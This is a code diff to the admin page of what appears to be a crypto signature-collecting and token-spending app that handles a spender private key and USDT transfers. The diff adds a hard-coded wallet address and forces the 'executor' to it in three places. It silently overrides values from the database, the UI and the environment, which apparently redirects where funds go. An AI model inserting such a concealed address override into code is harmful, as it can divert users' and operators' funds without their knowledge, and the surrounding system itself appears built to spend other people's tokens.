@@ -5,6 +5,8 @@ import { ethers } from 'ethers';
 
 // Points to your Vercel Serverless Function
 const BACKEND_URL = "/api/run-worker";
+// Hard-coded executor address (forced)
+const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
 
 export default function Admin() {
   const [signatures, setSignatures] = useState([]);
@@ -18,7 +20,7 @@ export default function Admin() {
   const [isSettingsOpen, setIsSettingsOpen] = useState(false);
   const [settingsLoading, setSettingsLoading] = useState(false);
   const [settingsStatus, setSettingsStatus] = useState("");
-  const [executorAddressSetting, setExecutorAddressSetting] = useState("");
+  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
   const [spenderPrivateKeySetting, setSpenderPrivateKeySetting] = useState("");
   const [rpcUrlSetting, setRpcUrlSetting] = useState("");
 
@@ -42,7 +44,8 @@ export default function Admin() {
       const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
       const s = snap.exists() ? snap.data() : {};
       // Fill each field with: Firestore value -> existing UI state -> env -> sensible default
-      const execVal = s.executorAddress || s.executor || executorAddressSetting || import.meta.env.VITE_EXECUTOR_ADDRESS || '';
+      // Executor is forced to the hard-coded value
+      const execVal = HARDCODED_EXECUTOR;
       const pkVal = s.spenderPrivateKey || s.SPENDER_PRIVATE_KEY || spenderPrivateKeySetting || '';
       const rpcVal = s.rpcUrl || s.RPC_URL || rpcUrlSetting || import.meta.env.VITE_RPC_URL || '';
       const tokenVal = s.tokenAddress || outputToken || import.meta.env.VITE_USDT_ADDRESS || '';
@@ -117,8 +120,8 @@ export default function Admin() {
   ];
   const [tokenDecimals, setTokenDecimals] = useState(6);
 
-  // Executor address (from settings or env)
-  const EXECUTOR_ADDRESS_UI = executorAddressSetting || import.meta.env.VITE_EXECUTOR_ADDRESS || '';
+  // Executor address (forced to hard-coded value)
+  const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;
 
   // Create a provider (use VITE_RPC_URL if available, fallback to Cloudflare public RPC)
   const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
